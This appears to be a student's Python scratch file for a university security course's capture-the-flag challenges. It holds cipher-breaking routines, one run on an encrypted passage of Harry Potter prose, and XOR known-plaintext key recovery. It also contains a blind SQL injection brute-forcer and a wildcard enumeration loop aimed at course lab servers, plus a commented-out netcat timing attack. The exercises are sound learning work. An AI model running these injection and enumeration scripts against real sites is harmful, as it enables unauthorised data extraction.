cypher_text = "AMNAWYH ZHHLJYF, PVHYZFLIU Z FZTV MOLKK AJYH NOY UHABIFP ZIF LINA NOY MZPNKY. TZFZT VATDHYC, NOY IBHPY, EZP RYVN WBPC WC Z PBFFYI PVZNY AD MAKFP ZTAIU NOY PNZDD ZIF PNBFYINP. OYH VYVVYHBV VANLAI EAHRYF LIPNZINKC, NOABUO LN KYDN NOY FHLIRYH PTARLIU ZN NOY YZHP DAH PYJYHZK OABHP ZDNYHEZHF. ULIIC EYZPKYC, EOA OZF WYYI KAARLIU VZKY, EZP WBKKLYF LINA NZRLIU PATY WC VYHMC. NOY PNYZT VABHLIU DHAT BIFYH OYH JLJLF OZLH UZJY NOY LTVHYPPLAI NOZN OYH EOAKY OYZF EZP AI DLHY.HZLIFHAVP NOY PLQY AD WBKKYNP NOBIFYHYF AI NOY MZPNKY ELIFAEP DAH FZCP AI YIF; NOY KZRY HAPY, NOY DKAEYH WYFP NBHIYF LINA TBFFC PNHYZTP, ZIF OZUHLF'P VBTVRLIP PEYKKYF NA NOY PLQY AD UZHFYI POYFP. AKLJYH EAAF'P YINOBPLZPT DAH HYUBKZH NHZLILIU PYPPLAIP, OAEYJYH, EZP IAN FZTVYIYF, EOLMO EZP EOC OZHHC EZP NA WY DABIF, KZNY AIY PNAHTC PZNBHFZC ZDNYHIAAI Z DYE FZCP WYDAHY OZKKAEYYI, HYNBHILIU NA UHCDDLIFAH NAEYH, FHYIMOYF NA NOY PRLI ZIF PVKZNNYHYF ELNO TBF.YJYI ZPLFY DHAT NOY HZLI ZIF ELIF LN OZFI'N WYYI Z OZVVC VHZMNLMY PYPPLAI. DHYF ZIF UYAHUY, EOA OZF WYYI PVCLIU AI NOY PKCNOYHLI NYZT, OZF PYYI DAH NOYTPYKJYP NOY PVYYF AD NOAPY IYE ILTWBP NEA NOABPZIF ZIF AIYP. NOYC HYVAHNYF NOZN NOY PKCNOYHLI NYZT EZP IA TAHY NOZI PYJYI UHYYILPO WKBHP, POAANLIU NOHABUO NOY ZLH KLRY TLPPLKYP.ZP OZHHC PXBYKMOYF ZKAIU NOY FYPYHNYF MAHHLFAH OY MZTY ZMHAPP PATYWAFC EOA KAARYF GBPN ZP VHYAMMBVLYF ZP OY EZP. IYZHKC OYZFKYPP ILMR, NOY UOAPN AD UHCDDLIFAH NAEYH, EZP PNZHLIU TAHAPYKC ABN AD Z ELIFAE, TBNNYHLIU BIFYH OLP WHYZNO, \". . . FAI'N DBKDLKK NOYLH HYXBLHYTYINP . . . OZKD ZI LIMO, LD NOZN . . .\"\"OYKKA, ILMR,\" PZLF OZHHC.\"OYKKA, OYKKA,\" PZLF IYZHKC OYZFKYPP ILMR, PNZHNLIU ZIF KAARLIU HABIF. OY EAHY Z FZPOLIU, VKBTYF OZN AI OLP KAIU MBHKC OZLH, ZIF Z NBILM ELNO Z HBDD, EOLMO MAIMYZKYF NOY DZMN NOZN OLP IYMR EZP ZKTAPN MATVKYNYKC PYJYHYF. OY EZP VZKY ZP PTARY, ZIF OZHHC MABKF PYY HLUON NOHABUO OLT NA NOY FZHR PRC ZIF NAHHYINLZK HZLI ABNPLFY.\"CAB KAAR NHABWKYF, CABIU VANNYH,\" PZLF ILMR, DAKFLIU Z NHZIPVZHYIN KYNNYH ZP OY PVARY ZIF NBMRLIU LN LIPLFY OLP FABWKYN.\"PA FA CAB,\" PZLF OZHHC.\"ZO,\" IYZHKC OYZFKYPP ILMR EZJYF ZI YKYUZIN OZIF, \"Z TZNNYH AD IA LTVAHNZIMY. . . . LN'P IAN ZP NOABUO L HYZKKC EZINYF NA GALI. . . . NOABUON L'F ZVVKC, WBN ZVVZHYINKC L 'FAI'N DBKDLKK HYXBLHYTYINP' -\"LI PVLNY AD OLP ZLHC NAIY, NOYHY EZP Z KAAR AD UHYZN WLNNYHIYPP AI OLP DZMY.\"WBN CAB EABKF NOLIR, EABKFI'N CAB,\" OY YHBVNYF PBFFYIKC, VBKKLIU NOY KYNNYH WZMR ABN AD OLP VAMRYN, \"NOZN PNHAIUYPN VZPPEAHF YJYH FYJLPYF LP MAHHYMNOAHPYWZNNYHCPNZVKY?\"\"AO - CYP,\" PZLF OZHHC, EOA EZP AWJLABPKC PBVVAPYF NA ZUHYY."

import time
def ceasear_cypher():
    for j in range(127):
        dycrypt = ""
        for i in cypher_text:
            dycrypt += chr(ord(i)-j)
        print(dycrypt+"\n")
def aInB(List1,List2):
    ListLeng=len(List1)
    foundIndexes=[]
    for i in range(len(List2)-ListLeng):
        if(List1==List2[i:i+ListLeng]):
            foundIndexes.append(i)
    return foundIndexes
def probability_Analisis():
    dic = {}
    dycryt = ""
    decipher = {
     "Y": "e",
     "Z": "a",
     "A": "o",
     "M":"c",
     "N":"t",
     "W":"b",
     "H":"r",
     "L":"i",
     "F":"d",
     "J":"v",
     "O":"h",
     "P":"s",
     "V":"p",
     "I":"n",
     "U":"g",
     "T":"m",
     "K":"l",
     "D":"f",
     "B":"u",
     "C":"y"
     #OCTOBER ARRIVED SPREADING A DAMP CHILL OVER THE GROUNDS AND INTO THE CASTLE MADAM POMFREY THE NURSE WAS KEPT BUSY BY A SUDDEN SPATE OF COLDS AMONG THE STAFF AND STUDENTS HER PEPPERUP POTION WORKED INSTANTLY THOUGH IT LEFT THE DRINKER SMOKING AT THE EARS FOR SEVERAL HOURS AFTERWARD GINNY WEASLEY WHO HAD BEEN LOOKING PALE WAS BULLIED INTO TAKING SOME BY PERCY THE STEAM POURING FROM UNDER HER VIVID HAIR GAVE THE IMPRESSION THAT HER WHOLE HEAD WAS ON FIRE RAINDROPS THE SIZE OF BULLETS THUNDERED ON

    }
    for i in cypher_text:
        if i in dic:
            dic[i] += 1
        else:
            dic[i] = 1
        if i in decipher:
            dycryt += decipher[i]
        else:
            dycryt += i
    print(dycryt)
    print(dic)
def readFileBytesToList(filePath="/home/whorehay/Desktop/challenge3"):
    encrptedFile = open(filePath,"rb")
    byte = encrptedFile.read(1);
    listOFBytes =[]
    while(byte):
        listOFBytes.append(byte)
        byte = encrptedFile.read(1);
    encrptedFile.close()
    return listOFBytes
def xorkeyencyrpthion():
    listOFBytes = readFileBytesToList()
    listOFBytesNorm = readFileBytesToList(filePath="/home/whorehay/Desktop/Desktop")
    encryptedstring = ">*:&/*>4/16=22.!\"! <\"2\"\'/&=+71$"
    otherKey= "0<45+6<4)5:6<$$3&=&=$6*-!0383-&"
    tonyKey = "8\"35$#05)9?.9;  $))/);,&).48<8*"
    stillGarbed = "mr{nr~pyp"
    listOFBytes = [char for char in encryptedstring]
    # listOFBytes = [char for char in stillGarbed]
    otherList = list(map(ord,[char for char in otherKey]))

    listOFBytesInints=list(map(ord, listOFBytes))
    listOFBytesInintsNorm=list(map(ord, listOFBytesNorm))

    # print(list(map(chr,[listOFBytesInints[i] ^ otherList[i] for i in range(31) ])))
    print("Encyrped Text Length {L}: ".format(L=len(listOFBytesInints)),list(map(chr, listOFBytesInints))[:9])
    # # KnownText=['P', 'K', '\x03', '\x04', '\x14','\x03','\x00', '\x00', '\x08', '\x00',]
    # KnownText = [c for c in "92dakls1210"]
    KnownText=['g','e','o','r','g','e','k','s']
    keytaken = list(map(ord, ['Y', 'O', 'U', 'T', 'H', 'O', 'U', 'G', 'H', 'T', 'Y', 'O', 'U', 'W', 'E', 'R', 'E', 'D', 'O', 'N', 'E','W', 'I', 'T', 'H','C', 'R', 'Y', 'P', 'T', 'O']))

    #
    PartailKey = PlainTextAttack(KnownText,listOFBytesInints)
    print(PartailKey)
    # print("char at: ",chr(PartailKey[47]))
    descrpted = Decrpty(listOFBytesInints,keytaken)
    print("dycryptattempt = {att}".format(att=descrpted))
    # tryDycrpt =bytes(descrpted)
    # writeNewZip(tryDycrpt)



def getXORkey(fileHeader,intialBytes):
    key=[]
    keystring = ""
    for b in range(len(fileHeader)):

        cHeaderB = fileHeader[b%len(fileHeader)]
        cInitialB = intialBytes[b]
        CKey = (cHeaderB ^ cInitialB)
        print(cHeaderB,cInitialB,CKey)
        keystring += "{0:b}".format(CKey)
        key.append(CKey)
    return key
def DecrptyWithKey(kbl,encrpted_Byte_list,offset=0):
    key_byte_list = kbl
    for i in range(offset):
        key_byte_list.append(0)
    newByteList = []
    for i,n in enumerate(encrpted_Byte_list):
        cKey =(key_byte_list[i%len(key_byte_list)])
        cEB = n
        newByte = cKey^cEB
        newByteList.append(newByte)
    return newByteList
def writeNewZip(ByteList):
    Decrpty = open("/home/whorehay/Desktop/solve", "wb")
    Decrpty.write(ByteList)
    Decrpty.close()
def Decrpty(EncrptedText,Key):
	DecrptyedText = []
	#Decryption: do the same as encryption
	for pos in range(len(EncrptedText)):
		DecrptyedText.append(EncrptedText[pos]^(Key[pos%len(Key)]))
	print("Dycrpt: ",list(map(chr, DecrptyedText)))
	return DecrptyedText

def PlainTextAttack(KnownText,EncrptedText,offset=0,keyLength=0):
	PartailKey = []
	for pos in range(len(EncrptedText)-offset-keyLength):
		PartailKey.append(EncrptedText[pos]^ord(KnownText[pos%len(KnownText)]))
	print("Partail key: "+ str(list(map(chr, PartailKey))))
	return PartailKey
def bruteforcePost():
    import requests
    url = 'http://ec521web.bu.edu/location_retrieve'

    with open('/home/whorehay/Desktop/Cites.txt') as f:
        lines = [line.rstrip() for line in f]
    listOfCitiesUS = lines
    average = 0
    for i in listOfCitiesUS:

        myobj = {'postid': i}
        x = requests.post(url, data = myobj)
        average += x.elapsed.total_seconds()
        if(x.text != "<table></table>"):
            print(x.text,i,"\n")
            print(x.elapsed.total_seconds())
            break
    else:
        print(len(listOfCitiesUS))
        print("no results")
    print(average/(len(listOfCitiesUS)-1))
def locationAlphBruteforce():
    import requests
    url = 'http://ec521web.bu.edu/location_retrieve'

    ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = "0123456789"
    total = ascii_letters+numbers
    listOfChars = [c for c in total]
    print(listOfChars)
    maxT1 = 0
    maxT2 = 0
    # KnownText = "aberystwyth"
    KnownText ="Boston"
    for i in listOfChars:
        inp = "\" or locname  like \'{str}%\' --".format(str=KnownText+i)
        # print(inp)
        myobj = {'postid': inp}
        x = requests.post(url, data = myobj)
        t = x.elapsed.total_seconds()
        if(x.text != "<table></table>"):
            print(x.text,i,"\n")
            print(x.elapsed.total_seconds())
            break
    #     if t>maxT1:
    #         maxT2 = maxT1
    #         maxT1 = t
    #     print(i,t)
    # print(maxT1,maxT2)
def sameBFDifferentDay():
    import requests
    url = 'http://ec521web.bu.edu:7034/menu.php?item='

    ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = "0123456789"
    total = ascii_letters+numbers
    listOfChars = [c for c in total]
    print(listOfChars)
    maxT1 = 0
    maxT2 = 0
    # KnownText = "aberystwyth"
    KnownText ="eskimochops_rulez"
    normText ="""<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>Browsemenu.php</title>
</head>
<body>
<h1>Menu</h1>
<div>
 </div>
</body>
</html>
"""
    # print(normText)
    for i in listOfChars:
        inp = url+KnownText+i+"*"


        x = requests.get(inp)
        if(x.text !=normText ):
            print(i)
        # t = x.elapsed.total_seconds()

    #
    #     #     print(x.text,i,"\n")
    #     #     print(x.elapsed.total_seconds())
    #     #     break
if __name__ == "__main__":
    # l1=['a','b','c']
    # l2=['k','s','c','b','a','d','s','d','a','b','c','d','e','s','e']
    # l3=['d','a','d','d','e','d']
    # xorkeyencyrpthion()
    # print("donezo")
    sameBFDifferentDay()
    # strings = "34.3"
    # print(strings + "2",float(strings)+2)
    # print(200000*1.34*0.000001)
# import random
# lists = ["CRYPTO","EC521","PASSWORDS","PROFESSOR", "TCP","HARD","BREAKING","BRUTEFORCE"]
# shuff = random.shuffle(lists)
# k = random.randint(0,len(lists))
# print("".join(lists[:k]))
    # import subprocess as sp
    # from shlex import split
    # printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
    # listOfAttemps = [chr for chr in printable]
    # listofOutputs = []

    # for i in listOfAttemps:
    #     # output = subprocess.run(["time", "echo", "{a}".format(a="hello"),"|","netcat" ,"ece-ec521-012.bu.edu", "1234"], capture_output=True, text=True)
    #     output = sp.run(["], capture_output=True, text=True)
    #     p1 = Popen(split("tar -c mydir"), stdout=PIPE)
    #     p2 = Popen(split("md5sum"), stdin=p1.stdout)
    #     userTime = output.stderr[:output.stderr.find("u")]
    #     sysTime = output.stderr[:output.stderr.find("CPU")-4]
    #     listofOutputs.append([i,sysTime])
    # for i in listofOutputs:
    #     print(i)
# mr{nr~pyp
